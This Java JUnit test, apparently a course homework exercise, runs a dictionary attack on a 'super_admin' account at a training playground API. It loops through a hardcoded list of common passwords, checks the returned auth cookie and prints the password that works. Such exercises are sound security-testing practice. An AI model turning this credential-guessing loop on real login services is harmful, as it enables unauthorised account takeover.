import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;


public class HackPass {
    @Test
    public void testHuckPass(){
        //Парсинг пароля
        String link0 = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords";
        //tree = html.fromstring(response.text)
        //locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
        //passwords = tree.xpath(locator)

        String[] passArray  = new String[] {"password","dragon","baseball","111111","iloveyou","master","sunshine",
                "ashley","bailey","passw0rd","shadow","123456","123123","654321","superman","qazwsx","michael",
                "football","12345678","qwerty","abc123","monkey","1234567","letmein","trustno1","jesus","ninja",
                "mustang","password1","adobe123[a]","admin","1234567890","photoshop[a]","1234","12345","princess",
                "azerty","0","123456789","access","696969","batman","1qaz2wsx","login","qwertyuiop","solo","starwars",
                "121212","flower","hottie","loveme","zaq1zaq1","hello","freedom","whatever","666666","!@#$%^&*",
                "charlie","aa123456","donald","qwerty123","1q2w3e4r","555555","lovely","7777777","welcome","888888",
                "123qwe","iloveyou"};

        Map<String, String> params = new HashMap<String,String>();

        for (int i = 0; i < passArray.length; i++) {
            params.put("login", "super_admin");
            params.put("password", passArray[i]);

            String link = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
            Response response = RestAssured
                    .given()
                    .body(params)
                    .post(link)
                    .andReturn();

            String authcookie = response.getCookie("auth_cookie");

            String link2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";

            Map<String, String> cookie = new HashMap<>();
            cookie.put("auth_cookie", authcookie);

            Response response1 = RestAssured
                    .given()
                    .body(params)
                    .cookies(cookie)
                    .when()
                    .post(link2)
                    .andReturn();

            String responseAuth = response1.asString();

            if (responseAuth.equals("You are authorized")){
                System.out.println("You are authorized");
                System.out.println("Correct password - " + passArray[i]);
                System.out.println(response1.getStatusCode());
            }
        }
    }
}

